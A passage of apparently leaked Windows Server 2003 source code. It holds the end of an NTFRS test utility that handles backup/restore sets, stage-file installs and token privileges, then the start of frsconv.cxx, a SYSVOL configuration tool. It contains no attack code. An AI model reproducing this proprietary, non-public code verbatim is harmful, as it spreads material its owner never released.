        if (WStatus != ERROR_INSUFFICIENT_BUFFER) {
            fprintf(stderr,
                    "ERROR NtFrsApiIsBackupRestoreSetASysvol(%d) Error %d\n",
                    BurSetIndex,
                    WStatus);
        }
        BufferSize = 1024;
        WStatus = NtFrsApiGetBackupRestoreSetDirectory(BurContext,
                                                       BurSet,
                                                       &BufferSize,
                                                       Buffer);
        if (!WIN_SUCCESS(WStatus)) {
            fprintf(stderr,
                    "ERROR NtFrsApiIsBackupRestoreSetASysvol(%d) Error %d\n",
                    BurSetIndex,
                    WStatus);
            goto DESTROY;
        }
        //
        // Paths
        //
        Buffer2Size = 1;
        FiltersSize = 1;
        WStatus = NtFrsApiGetBackupRestoreSetPaths(BurContext,
                                                   BurSet,
                                                   &Buffer2Size,
                                                   Buffer2,
                                                   &FiltersSize,
                                                   Filters);
        if (WStatus != ERROR_INSUFFICIENT_BUFFER) {
            fprintf(stderr,
                    "ERROR NtFrsApiGetBackupRestorePaths(%d) Error %d\n",
                    BurSetIndex,
                    WStatus);
        }
        Buffer2Size = 1024;
        FiltersSize = 1;
        WStatus = NtFrsApiGetBackupRestoreSetPaths(BurContext,
                                                   BurSet,
                                                   &Buffer2Size,
                                                   Buffer2,
                                                   &FiltersSize,
                                                   Filters);
        if (WStatus != ERROR_INSUFFICIENT_BUFFER) {
            fprintf(stderr,
                    "ERROR NtFrsApiGetBackupRestorePaths(FILTERS %d) Error %d\n",
                    BurSetIndex,
                    WStatus);
        }

        Buffer2Size = 1024;
        FiltersSize = 1024;
        WStatus = NtFrsApiGetBackupRestoreSetPaths(BurContext,
                                                   BurSet,
                                                   &Buffer2Size,
                                                   Buffer2,
                                                   &FiltersSize,
                                                   Filters);
        if (!WIN_SUCCESS(WStatus)) {
            fprintf(stderr,
                    "ERROR NtFrsApiGetBackupRestorePaths(%d) Error %d\n",
                    BurSetIndex,
                    WStatus);
            goto DESTROY;
        }
        if (IsSysvol) {
            printf("BurSet %d: %ws is a sysvol\n",
                   BurSetIndex,
                   Buffer);
        } else {
            printf("BurSet %d: %ws\n",
                   BurSetIndex,
                   Buffer);
        }
        if (Buffer2Size) {
            Str = Buffer2;
            while(*Str) {
                printf("    Path  : %ws\n", Str);
                Str += wcslen(Str) + 1;
            }
        }
        if (FiltersSize) {
            Str = Filters;
            while(*Str) {
                printf("    Filter: %ws\n", Str);
                Str += wcslen(Str) + 1;
            }
        }
        Dir = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(DIRS));
        Dir->Dir = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, BufferSize);
        CopyMemory(Dir->Dir, Buffer, BufferSize);
        Dir->BurSet = BurSet;
        Dir->Next = Dirs;
        Dirs = Dir;
        ++BurSetIndex;
    }
    if (!WIN_SUCCESS(WStatus) && WStatus != ERROR_NO_MORE_ITEMS) {
        fprintf(stderr,
                "ERROR NtFrsApiEnumBackupRestoreSets(%d) Error %d\n",
                BurSetIndex,
                WStatus);
        goto DESTROY;
    }
    for (i = 2; i < argc; ++i) {
        if (*Argv[i] == L'/') {
            continue;
        }
        DirPath = Argv[i++];
        if (i >= argc) {
            printf("%ws does not have a corresponding primary|nonauth\n",
                   DirPath);
            continue;
        }
        DirType = Argv[i];
        printf("Processing %ws %ws\n", DirPath, DirType);
        if (!_wcsicmp(DirType, L"primary")) {
            BurFlags = NTFRSAPI_BUR_FLAGS_PRIMARY;
        } else if (!_wcsicmp(DirType, L"nonauth")) {
            BurFlags = NTFRSAPI_BUR_FLAGS_NON_AUTHORITATIVE;
        } else {
            printf("Don't understand %ws\n", DirType);
            continue;
        }
        for (Dir = Dirs; Dir; Dir = Dir->Next) {
            if (!_wcsicmp(Dir->Dir, DirPath)) {
                break;
            }
        }
        if (!Dir) {
            printf("%ws not found\n", DirPath);
            continue;
        }
        WStatus = NtFrsApiRestoringDirectory(BurContext,
                                             Dir->BurSet,
                                             BurFlags);
        if (!WIN_SUCCESS(WStatus)) {
            fprintf(stderr,
                    "ERROR NtFrsApiRestoringDirectory(%ws, %08x) Error %d\n",
                    DirPath,
                    BurFlags,
                    WStatus);
            continue;
        }
        WStatus = NtFrsApiFinishedRestoringDirectory(BurContext,
                                                     Dir->BurSet,
                                                     NTFRSAPI_BUR_FLAGS_NONE);
        if (!WIN_SUCCESS(WStatus)) {
            fprintf(stderr,
                    "ERROR NtFrsApiFinishedRestoringDirectory(%ws, %08x) Error %d\n",
                    DirPath,
                    BurFlags,
                    WStatus);
            continue;
        }
        printf("Finished restoring %ws\n", DirPath);
    }

DESTROY:
    if (Spin) {
        printf("Spinning...\n");
    }
    while (Spin) {
        Sleep(2 * 1000);
    }
    BufferSize = 1024;
    WStatus = NtFrsApiDestroyBackupRestore(&BurContext,
                                           DestroyBurFlags,
                                           (ExpectKey) ? &HKey : NULL,
                                           (ExpectKey) ? &BufferSize : NULL,
                                           (ExpectKey) ? Buffer : NULL);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr,
                "ERROR NtFrsApiDestroyBackupRestore(%08x) Error %d\n",
                DestroyBurFlags,
                WStatus);
        exit(1);
    }
    if (ExpectKey) {
        printf("%08x HKey, %d KeySize, %ws\n", HKey, BufferSize, Buffer);
    }

#if 0
    WStatus = NtFrsApi_GetReplicatedDirectoriesW(FrsErrorCallBack, &Dirs);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "ERROR NtFrsApi_GetReplicatedDirectories() Error %d\n", WStatus);
        exit(1);
    }
    if (Dirs) {
        while (*Dirs != L'\0') {
            fprintf(stdout, "Dirs:%ws:\n", Dirs);
            Dirs = &Dirs[wcslen(Dirs) + 1];
        }
        LocalFree(Dirs);
    }
    WStatus = NtFrsApi_StopServiceForFullNonAuthRestoreW(Primary,
                                                         FrsErrorCallBack);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "ERROR NtFrsApi_StopServiceForFullNonAuth() Error %d\n", WStatus);
        exit(1);
    }
    WStatus = NtFrsApi_StartServiceAfterFullNonAuthRestoreW(FrsErrorCallBack);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "ERROR NtFrsApi_StartServiceAfterFullNonAuth() Error %d\n", WStatus);
        exit(1);
    }
#endif 0
    exit(0);
}


VOID
ProcessComm(
    IN DWORD    argc,
    IN PWCHAR   *Argv,
    IN DWORD    CommCommand
    )
/*++
Routine Description:
    Dump bunches of stuff

Arguments:
    argc
    Argv
    CommCommand

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    DWORD   WStatus;
    PWCHAR  Line;
    PWCHAR  ComputerName1 = NULL;
    PWCHAR  ComputerName2 = NULL;
    PWCHAR  Account = NULL;
    PWCHAR  Password = NULL;
    PVOID   Info = NULL;

    if (argc > 2) {
        ComputerName1 = Argv[2];
        if (ComputerName1 && !*ComputerName1) {
            ComputerName1 = NULL;
        }
    }
    if (argc > 3) {
        ComputerName2 = Argv[3];
        if (ComputerName2 && !*ComputerName2) {
            ComputerName2 = NULL;
        }
    }
    if (argc > 4) {
        Account = Argv[4];
        if (Account && !*Account) {
            Account = NULL;
        }
    }
    if (argc > 5) {
        Password = Argv[5];
        if (Password && !*Password) {
            Password = NULL;
        }
    }

#if 0
    not yet implemented
    WStatus = NtFrsApi_CommW(CommCommand,
                             ComputerName1,
                             ComputerName2,
                             Account,
                             Password,
                             &Info);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "NtFrsApi_CommW() -> %d\n", WStatus);
        exit(1);
    }
    Line = NULL;
AGAIN:
    WStatus = NtFrsApi_InfoLineW(Info, &Line);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "NtFrsApi_InfoLineW() -> %d\n", WStatus);
        exit(1);
    }
    if (Line) {
        printf("%ws", Line);
        goto AGAIN;
    }
    NtFrsApi_Free_InfoW(&Info);
#endif 0
    exit(0);
}


#define PRIV_BUF_LENGTH    (1024)
VOID
LogOnAsComputer(
    )
/*++
Routine Description:
    Check if the caller is a member of Groups

Arguments:
    ServerHandle
    Groups

Return Value:
    Win32 Status
--*/
{
#define  DEBSUB  "CheckGroups:"
    DWORD               WStatus;
    PVOID               PrivBuf;
    DWORD               PrivBufLen;
    DWORD               LastPrivBufLen;
    HANDLE              IdHandle;
    HANDLE              TokenHandle;
    DWORD               i;
    DWORD               j;
    TOKEN_PRIVILEGES    *Tp;
    DWORD               ComputerLen;
    WCHAR               ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD               PrivLen;
    WCHAR               PrivName[MAX_PATH + 1];

    ComputerLen = MAX_COMPUTERNAME_LENGTH;
    ComputerName[0] = L'\0';
    if (!GetComputerName(ComputerName, &ComputerLen)) {
        printf("FRS: Cannot get the computer's name\n");
        return;
    }
    printf("Computer name is %ws\n", ComputerName);

    //
    // For this process
    //
    IdHandle = GetCurrentProcess();
    if (!OpenProcessToken(IdHandle, TOKEN_QUERY, &TokenHandle)) {
        WStatus = GetLastError();
        printf("Can't open process token; WStatus %d\n", WStatus);
        goto cleanup;
    }

    //
    // Get the groups from the access token for this thread or process
    //
    PrivBufLen = PRIV_BUF_LENGTH;
    do {
        PrivBuf = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, PrivBufLen);
        LastPrivBufLen = PrivBufLen;
        if (!GetTokenInformation(TokenHandle,
                                 TokenPrivileges,
                                 PrivBuf,
                                 PrivBufLen,
                                 &PrivBufLen)) {
            WStatus = GetLastError();
            printf("Can't get privs groups; WStatus %d (lastlen %d; curlen %d\n",
                   WStatus,
                   LastPrivBufLen,
                   PrivBufLen);
            FREE(PrivBuf);
        } else {
            WStatus = ERROR_SUCCESS;
        }

    } while (!WIN_SUCCESS(WStatus) && LastPrivBufLen < PrivBufLen);
    if (!WIN_SUCCESS(WStatus)) {
        goto cleanup;
    }

    Tp = (TOKEN_PRIVILEGES *)PrivBuf;
    for (i = 0; i < Tp->PrivilegeCount; ++i) {
        PrivLen = MAX_PATH + 1;
        if (!LookupPrivilegeName(NULL,
                                 &Tp->Privileges[i].Luid,
                                 PrivName,
                                 &PrivLen)) {
            printf("lookuppriv error %d\n", GetLastError());
            exit(0);
        }
        printf("Priv %d is %ws\n", i, PrivName);
    }

    printf("Okay\n");

    CloseHandle(TokenHandle);
    if (!LogonUser(L"Administrator",
                  NULL,
                  NULL,
                  LOGON32_LOGON_SERVICE,
                  LOGON32_PROVIDER_DEFAULT,
                  &TokenHandle)) {
        printf("ERROR - %d logon\n", GetLastError());
        exit(0);
    }

cleanup:
    CloseHandle(TokenHandle);
    CloseHandle(IdHandle);
    FREE(PrivBuf);
}

// --------------- Process Install Stage


BOOL
FrsSetCompression(
    IN PWCHAR   Path,
    IN HANDLE   Handle,
    IN USHORT   TypeOfCompression
    )
/*++
Routine Description:
    Enable compression on Handle.

Arguments:
    Path
    Handle
    TypeOfCompression

Return Value:
    Set the compression mode on a file
--*/
{
    DWORD   BytesReturned;
    if (!DeviceIoControl(Handle,
                         FSCTL_SET_COMPRESSION,
                         &TypeOfCompression,
                         sizeof(TypeOfCompression),
                         NULL,
                         0,
                         &BytesReturned,
                         NULL)) {
        Win32ToMsg(Path, GetLastError());
        return FALSE;
    }
    return TRUE;
}


BOOL
FrsSetFileAttributes(
    PWCHAR  Path,
    HANDLE  Handle,
    ULONG   FileAttributes
    )
/*++
Routine Description:
    This routine sets the file's attributes

Arguments:
    Path        - for error messages
    Handle      - Supplies a handle to the file that is to be marked for delete.
    Attributes  - Attributes for the file
Return Value:
    TRUE - attributes have been set
    FALSE
--*/
{
    IO_STATUS_BLOCK         IoStatus;
    FILE_BASIC_INFORMATION  BasicInformation;
    NTSTATUS                Status;

    //
    // Set the attributes
    //
    ZeroMemory(&BasicInformation, sizeof(BasicInformation));
    BasicInformation.FileAttributes = FileAttributes | FILE_ATTRIBUTE_NORMAL;
    Status = NtSetInformationFile(Handle,
                                  &IoStatus,
                                  &BasicInformation,
                                  sizeof(BasicInformation),
                                  FileBasicInformation);
    if (!NT_SUCCESS(Status)) {
        fprintf(stderr, "NtSetFileInformationFile(%ws); NtStatus 0x%08x\n",
                Path,
                Status);
        return FALSE;
    }
    return TRUE;
}



DWORD
FrsSetFilePointer(
    IN PWCHAR       Name,
    IN HANDLE       Handle,
    IN ULONG        High,
    IN ULONG        Low
    )
/*++
Routine Description:
    Position file pointer

Arguments:
    Handle
    Name
    High
    Low

Return Value:
    Win32 Error Status

--*/
{
#undef DEBSUB
#define DEBSUB  "FrsSetFilePointer:"

    DWORD WStatus;

    Low = SetFilePointer(Handle, Low, &High, FILE_BEGIN);

    if (Low == INVALID_SET_FILE_POINTER) {
        WStatus = GetLastError();
        if (WStatus != NO_ERROR) {
            Win32ToMsg(Name, WStatus);
            return WStatus;
        }
    }

    return ERROR_SUCCESS;
}



BOOL
StuReadFile(
    IN  PWCHAR  Path,
    IN  HANDLE  Handle,
    IN  PVOID   Buf,
    IN  DWORD   BytesToRead,
    OUT PDWORD  BytesRead
    )
/*++
Routine Description:
    Read data from a file

Arguments:
    Path
    Handle
    Buf
    BytesToRead

Return Value:
    TRUE    - no problem
    FALSE   - couldn't read
--*/
{
    BOOL    DidRead;

   //
   // Read the file's name into the file
   //
   DidRead = ReadFile(Handle, Buf, BytesToRead, BytesRead, NULL);

   //
   // Read error
   //
   if (!DidRead) {
       Win32ToMsg(Path, GetLastError());
       return FALSE;
   }
   //
   // Done
   //
   return TRUE;
}


BOOL
FrsSetFileTime(
    IN PWCHAR       Path,
    IN HANDLE       Handle,
    IN FILETIME     *CreateTime,
    IN FILETIME     *AccessTime,
    IN FILETIME     *WriteTime
    )
/*++
Routine Description:
    Position file pointer

Arguments:
    Path
    Handle
    Attributes
    CreateTime
    AccessTime
    WriteTime

Return Value:
    TRUE    - no problem
    FALSE   - couldn't set size
--*/
{
   if (!SetFileTime(Handle, CreateTime, AccessTime, WriteTime)) {
       Win32ToMsg(Path, GetLastError());
       return FALSE;
   }
   return TRUE;
}


#define IOSIZE  (64 * 1024)
VOID
ProcessInstall(
    IN DWORD    argc,
    IN PWCHAR   *Argv
    )
/*++
Routine Description:
    Restore the StagePath to TargetPath if TargetPath is non-NULL.

Arguments:
    argc    - number of argv's
    Argv    - stagepath and, optionally, targetpath

Return Value:
    Win32 status
--*/
{
    BOOL            IsDir;
    BOOL            ExistingOid;
    ULONG           High;
    ULONG           Low;
    ULONG           WStatus;
    ULONG           Restored;
    ULONG           ToRestore;
    ULONG           FileOffset;
    PUCHAR          RestoreBuf      = NULL;
    PVOID           RestoreContext  = NULL;
    DWORD           BytesRead       = 0;
    HANDLE          StageHandle     = INVALID_HANDLE_VALUE;
    PWCHAR          StagePath       = NULL;
    PWCHAR          TargetPath      = NULL;
    HANDLE          TargetHandle    = INVALID_HANDLE_VALUE;
    STAGE_HEADER    Header;
    WIN32_STREAM_ID *StreamId = NULL;
    DWORD           RestoreStreamOffset = 0;
#if 0
typedef struct _WIN32_STREAM_ID {
        DWORD          dwStreamId ;
        DWORD          dwStreamAttributes ;
        LARGE_INTEGER  Size ;
        DWORD          dwStreamNameSize ;
        WCHAR          cStreamName[ ANYSIZE_ARRAY ] ;
} WIN32_STREAM_ID, *LPWIN32_STREAM_ID ;
#endif 0

    //
    // Check params
    //
    if (argc < 3 || argc > 4) {
        Usage(1);
    }

    StagePath = Argv[2];
    if (argc == 4) {
        TargetPath = Argv[3];
    }

    printf("%ws %ws %ws %ws\n",
           Argv[0],
           Argv[1],
           Argv[2],
           (argc == 4) ? Argv[3] : L"");


    //
    // Open the stage file for shared, sequential reads
    //
    //
    // Open the file
    //
    printf("Stage path: %ws\n", StagePath);
    StageHandle = CreateFile(StagePath,
                             GENERIC_READ,
                             FILE_SHARE_READ,
                             NULL,
                             OPEN_EXISTING,
                             FILE_FLAG_SEQUENTIAL_SCAN |
                             FILE_FLAG_BACKUP_SEMANTICS,
                             NULL);
    if (StageHandle == INVALID_HANDLE_VALUE) {
        Win32ToMsg(StagePath, GetLastError());
        Win32ToMsg(L"CreateFile(StagePath)", GetLastError());
        goto CLEANUP;
    }


    //
    // Read the header
    //
    if (!ReadFile(StageHandle,
                  &Header,
                  sizeof(STAGE_HEADER),
                  &BytesRead,
                  NULL)) {
        Win32ToMsg(StagePath, GetLastError());
        goto CLEANUP;
    }
    if (BytesRead != sizeof(STAGE_HEADER)) {
        fprintf(stderr, "%ws: Read %d bytes, not %d\n",
                StagePath,
                BytesRead,
                sizeof(STAGE_HEADER));
        goto CLEANUP;
    }
    printf("Stage Header:\n");
    printf("\tName       : %ws\n",  Header.ChangeOrderCommand.FileName);
    printf("\tMajor      : %08x\n", Header.Major);
    printf("\tMinor      : %08x\n", Header.Minor);
    printf("\tDataHigh   : %08x\n", Header.DataHigh);
    printf("\tDataLow    : %08x\n", Header.DataLow);
    printf("\tCompression: %08x\n", Header.Compression);
    printf("\tAttributes : %08x\n", Header.Attributes.FileAttributes);

    //
    // Don't understand this header format
    //
    if (Header.Major != NTFRS_MAJOR) {
        fprintf(stderr, "%ws: Major %d != NtFrsMajor %d\n",
                StagePath,
                Header.Major,
                NTFRS_MAJOR);
        goto CLEANUP;
    }

    if (!TargetPath) {
        goto CLEANUP;
    }

    //
    // INSTALL STAGE FILE
    //
    //
    // Open the file
    //
    printf("Target path: %ws\n", TargetPath);
    IsDir = Header.Attributes.FileAttributes & FILE_ATTRIBUTE_DIRECTORY;
    TargetHandle = CreateFile(TargetPath,
                              RESTORE_ACCESS,
                              0,
                              NULL,
                              OPEN_ALWAYS,
                              OPEN_OPTIONS,
                              NULL);
    if (TargetHandle == INVALID_HANDLE_VALUE) {
        Win32ToMsg(TargetPath, GetLastError());
        Win32ToMsg(L"CreateFile(TargetPath)", GetLastError());
        goto CLEANUP;
    }

    //
    // Truncate the file if not a directory
    //
    if (!IsDir && !SetEndOfFile(TargetHandle)) {
        Win32ToMsg(TargetPath, GetLastError());
        goto CLEANUP;
    }

    //
    // Set compression mode
    //
    if (!FrsSetCompression(TargetPath,
                           TargetHandle,
                           Header.Compression)) {
        goto CLEANUP;
    }

    //
    // Set attributes
    //
    if (!FrsSetFileAttributes(TargetPath,
                              TargetHandle,
                              Header.Attributes.FileAttributes &
                              ~NOREPL_ATTRIBUTES)) {
        goto CLEANUP;
    }


    //
    // Seek to the first byte of data in the stage file
    //
    if (FrsSetFilePointer(StagePath,
                          StageHandle,
                          Header.DataHigh,
                          Header.DataLow) != ERROR_SUCCESS) {
        goto CLEANUP;
    }
    FileOffset = Header.DataLow;


    //
    // Restore the stage file into the temporary file
    //
    RestoreBuf = LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, IOSIZE);

    do {
        //
        // read stage
        //
        printf("Reading %d bytes at %08x\n", IOSIZE, FileOffset);
        if (!StuReadFile(StagePath,
                         StageHandle,
                         RestoreBuf,
                         IOSIZE,
                         &ToRestore)) {
            goto CLEANUP;
        }
        printf("Read %d bytes at %08x\n", ToRestore, FileOffset);
        FileOffset += ToRestore;

        if (ToRestore == 0) {
            break;
        }

        //
        // Dump stream heads in first restore buffer
        // Increase buffer size to catch all heads OR
        // enhance code to remember stream head offsets
        // across restore bufs.
        //
        if (StreamId == NULL) {
            RestoreStreamOffset = 0;
            while (RestoreStreamOffset < ToRestore) {
                StreamId = (WIN32_STREAM_ID *)(RestoreBuf + RestoreStreamOffset);
                printf("StreamId: %08x %d (%08x)\n", StreamId, RestoreStreamOffset);
                printf("dwStreamId: %d\n", StreamId->dwStreamId);
                printf("dwStreamAttributes: %08x\n", StreamId->dwStreamAttributes);
                printf("Size High: %08x\n", StreamId->Size.HighPart);
                printf("Size Low: %08x\n", StreamId->Size.LowPart);
                printf("dwStreamNameSize: %d\n", StreamId->dwStreamNameSize);
                RestoreStreamOffset += (sizeof(WIN32_STREAM_ID) - 4);
                RestoreStreamOffset += StreamId->dwStreamNameSize;
                RestoreStreamOffset += StreamId->Size.LowPart;
            }
        }

        if (!BackupWrite(TargetHandle,
                         RestoreBuf,
                         ToRestore,
                         &Restored,
                         FALSE,
                         TRUE,
                         &RestoreContext)) {
            WStatus = GetLastError();
            printf("BackupWrite(%08x, %d) returned %d\n",
                   RestoreContext,
                   ToRestore,
                   WStatus);
            if (IsDir && WStatus == ERROR_ALREADY_EXISTS) {
                fprintf(stderr, "%ws: WStatus %d IGNORED; dirs and altstreams\n",
                        TargetPath,
                        WStatus);
            }
            //
            // Uknown stream header or couldn't apply object id
            //
            if (WStatus == ERROR_INVALID_DATA ||
                WStatus == ERROR_DUP_NAME     ||
                (IsDir && WStatus == ERROR_ALREADY_EXISTS)) {
                //
                // Seek to the next stream. Stop if there are none.
                //
                printf("BackupWrite() returned %d; try to seek past bad data\n", WStatus);
                BackupSeek(TargetHandle,
                           -1,
                           -1,
                           &Low,
                           &High,
                           &RestoreContext);
                if (Low == 0 && High == 0) {
                    printf("BackupSeek failed; abort\n");
                    break;
                }
                fprintf(stderr, "%ws: WStatus %d IGNORED; BackupSeek() okay\n",
                        TargetPath,
                        WStatus);
            } else {
                //
                // Unknown error; abort
                //
                Win32ToMsg(TargetPath, GetLastError());
                goto CLEANUP;
            }
        } else {
            printf("BackupWrite(%08x, %d) okay\n", RestoreContext, ToRestore);
        }
    } while (TRUE);

#if 0
    //
    // Insure the correct object ID is on the file.
    //
    FRS_ASSERT(!memcmp(Header->FileObjId.ObjectId, &Coc->FileGuid, sizeof(GUID)));
    bugbug("do we have to write the extend OID data here???")
    WStatus = FrsGetOrSetFileObjectId(DstHandle,
                                      Coc->FileName,
                                      TRUE,
                                      &Header->FileObjId);
    if (WStatus == ERROR_DUP_NAME) {
        DPRINT2(0, "Stealing object id for %ws; WStatus %d\n",
                Coc->FileName,
                WStatus);
        ZeroMemory(&FileObjID, sizeof(FileObjID));
        FrsUuidCreate((GUID *)(&FileObjID.ObjectId[0]));

        ExistingOid = FALSE;
        WStatus = ChgOrdHammerObjectId(Coc->FileName,
                                       &Coc->FileGuid,
                                       OBJECT_ID_LENGTH,
                                       Coc->NewReplica->pVme,
                                       TRUE,
                                       NULL,
                                       &FileObjID,
                                       &ExistingOid);
        if (WIN_SUCCESS(WStatus)) {
            WStatus = FrsGetOrSetFileObjectId(DstHandle,
                                              Coc->FileName,
                                              TRUE,
                                              &Header->FileObjId);
        }
        if (!WIN_SUCCESS(WStatus)) {
            DPRINT2(0, "Retry install of %ws because of object id; WStatus %d\n",
                    Coc->FileName,
                    WStatus);
            WStatus = ERROR_RETRY;
        }
    }
    if (!WIN_SUCCESS(WStatus)) {
        goto out;
    }
#endif 0

    //
    // Set times
    //
    if (!FrsSetFileTime(TargetPath,
                        TargetHandle,
                        (PFILETIME)&Header.Attributes.CreationTime.QuadPart,
                        (PFILETIME)&Header.Attributes.LastAccessTime.QuadPart,
                        (PFILETIME)&Header.Attributes.LastWriteTime.QuadPart)) {
        goto CLEANUP;
    }

    //
    // Set final attributes
    //
    if (!FrsSetFileAttributes(TargetPath,
                              TargetHandle,
                              Header.Attributes.FileAttributes)) {
        goto CLEANUP;
    }

    //
    // Make sure all of the data is on disk. We don't want to lose
    // it across reboots
    //
    if (!FlushFileBuffers(TargetHandle)) {
        Win32ToMsg(TargetPath, GetLastError());
        goto CLEANUP;
    }

CLEANUP:
    //
    // Free up the restore context before we close TmpHandle (just in case)
    //
    if (RestoreContext) {
        printf("Discard BackupWrite(%08x)\n", RestoreContext);
        BackupWrite(TargetHandle,
                    NULL,
                    0,
                    NULL,
                    TRUE,
                    TRUE,
                    &RestoreContext);
    }
    if (StageHandle && StageHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(StageHandle);
    }
    if (TargetHandle && TargetHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(TargetHandle);
    }
    FREE(RestoreBuf);
    printf("Install of %ws into %ws complete\n",
           StagePath,
           TargetPath);
}
// ----------------


VOID _cdecl
main(
    IN DWORD argc,
    IN PCHAR *argv
    )
/*++
Routine Description:
    Process the command line.

Arguments:
    argc
    argv

Return Value:
    Exits with 0 if everything went okay. Otherwise, 1.
--*/
{
    PWCHAR  *Argv;

    //
    // Print usage and exit
    //
    if (argc == 1) {
        Usage(0);
    }

    //
    // Use wide char parameters
    //
    Argv = ConvertArgv(argc, argv);

    //
    // Find the subcommand
    //
    if (!wcscmp(Argv[1], L"poll")) {
        ProcessPoll(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"promote")) {
        ProcessPromote(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"promoteabort")) {
        ProcessPromoteAbort(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"promotesysvols")) {
        ProcessPromoteSysVols(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"demote")) {
        ProcessDemote(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"demoteabort")) {
        ProcessDemoteAbort(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"demotesysvols")) {
        ProcessDemoteSysVols(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"version")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_VERSION);
    } else if (!_wcsicmp(Argv[1], L"sets")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_SETS);
    } else if (!_wcsicmp(Argv[1], L"ds")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_DS);
    } else if (!_wcsicmp(Argv[1], L"memory")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_MEMORY);
    } else if (!_wcsicmp(Argv[1], L"idtable")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_IDTABLE);
    } else if (!_wcsicmp(Argv[1], L"inlog")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_INLOG);
    } else if (!_wcsicmp(Argv[1], L"outlog")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_OUTLOG);
    } else if (!_wcsicmp(Argv[1], L"threads")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_THREADS);
    } else if (!_wcsicmp(Argv[1], L"stage")) {
        ProcessDump(argc, Argv, NTFRSAPI_INFO_TYPE_STAGE);
    } else if (!_wcsicmp(Argv[1], L"install")) {
        ProcessInstall(argc, Argv);
    } else if (!_wcsicmp(Argv[1], L"restore")) {
        ProcessBackupRestore(argc, Argv, NTFRSAPI_BUR_FLAGS_RESTORE);
    } else if (!_wcsicmp(Argv[1], L"backup")) {
        ProcessBackupRestore(argc, Argv, NTFRSAPI_BUR_FLAGS_BACKUP);
    } else if (!_wcsicmp(Argv[1], L"comm")) {
        // Not implemented
        // ProcessComm(argc, Argv, NTFRSAPI_COMM_COMMAND_TEST);
    } else {
        fprintf(stderr, "Don't understand %ws\n", Argv[1]);
        Usage(1);
    }
    exit(0);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\frsconv\frsconv.cxx ===
extern "C" {
#include    <nt.h>
#include    <ntrtl.h>
#include    <nturtl.h>
#include    <ntioapi.h>
#include    <windows.h>
#include    <stdlib.h>
#include    <stdio.h>
#include    <lm.h>
#include    <netcan.h>
#include    <icanon.h>
#include    <dsgetdc.h>
#include    <dsrole.h>
}

/*
 * This program performs the steps necessary to configure NTFRS on a DC, prepared
 * to support the system and enterprise volumes.
 *
 * It was created as an interim tool to support the initialization of NTFRS on a DC
 *  which was running NT5 generation software before NTFRS was available.  After upgrading
 *  that DC with the latest NT5 version, this tool must be manually run to complete the
 *  initialization of NTFRS and system volumes.
 */


WCHAR SysVolShare[] = L"SYSVOL";
WCHAR SysVolRemark[] = L"System Volume Share (Migrated)";
WCHAR FRSSysvol[] = L"System\\CurrentControlSet\\Services\\NtFrs\\Parameters\\Sysvol";

#define DSROLEP_FRS_COMMAND     L"Replica Set Command"
#define DSROLEP_FRS_NAME        L"Replica Set Name"
#define DSROLEP_FRS_TYPE        L"Replica Set Type"
#define DSROLEP_FRS_PRIMARY     L"Replica Set Primary"
#define DSROLEP_FRS_STAGE       L"Replica Set Stage"
#define DSROLEP_FRS_ROOT        L"Replica Set Root"
#define DSROLEP_FRS_CREATE      L"Create"
#define DSROLEP_FRS_DELETE      L"Delete"
#define DSROLEP_FRS_COMMITTED   L"SysVol Information is Committed"
#define DSROLEP_FRS_LONG_NAME   L"Microsoft File Replication Service"
#define DSROLEP_FRS_SHORT_NAME  L"NtFrs"

//
// These are the static directories created within a system volume share
//
LPWSTR StaticSysvolDirs[] = {
    L"sysvol",
    L"domain",
    L"enterprise",
    L"staging",
    L"staging areas",

    L"sysvol\\enterprise",
    L"staging\\domain",
    L"staging\\enterprise",
    0
};

//
// Print out the usage message
//
void
Usage( int argc, char *argv[] )
{
    fprintf( stderr, "Usage: %s [-D] [-E] sysvol\n\n", argv[0] );
    fprintf( stderr, "       -D  this is the first upgraded DC in this domain\n\n" );
    fprintf( stderr, "       -E  this is the first upgraded DC in this enterprise\n\n" );
    fprintf( stderr, "       sysvol is the path for the system volume share.\n" );
    fprintf( stderr, "         The system volume must reside on NTFS version 5\n" );
}

//
// Print 'text' and render 'code' into an error message
//
void
errmsg( char *text, ULONG code )
{
    int i;
    char msg[ 100 ];

    i = FormatMessageA( FORMAT_MESSAGE_FROM_SYSTEM | sizeof( msg ),
               NULL,
               code,
               0,
               msg,
               sizeof(msg),
               NULL );

    if( i )
        fprintf( stderr, "%s: %s\n", text ? text : "", msg );
    else
        fprintf( stderr, "%s: error %d\n", text ? text : "", code );
}

//
// Print unicode 'text' and render 'code' into an error message
//
void
errmsg( LPWSTR text, ULONG code )
{
    int i;
    WCHAR msg[ 100 ];

    i = FormatMessageW( FORMAT_MESSAGE_FROM_SYSTEM | sizeof( msg ),
               NULL,
               code,
               0,
               msg,
